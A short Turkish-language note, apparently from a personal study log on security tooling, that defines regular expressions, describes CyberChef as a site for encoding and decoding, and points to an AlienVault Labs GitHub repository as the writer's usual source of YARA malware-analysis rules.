Regex metin içinde belirli desenleri tanımlayıp eşleştirmeye yarayan kısaltılmış kurallar bütünüdür. Karakterler kullanılarak karmaşık arama ve veri çıkarımı işlemlerini hızlıca yapmanızı sağlar.

CyberChef içerisinde bir çok encoding ve encryption methodunun bulunduğu, otomatik çözücüler sayesinde encoding ve decodingin kolayca yapılabildiği bir github sitesidir.

Yara kuralları için ise genelde (https://github.com/AlienVault-Labs/AlienVaultLabs/tree/master/malware_analysis) github adresini kontrol ediyorum.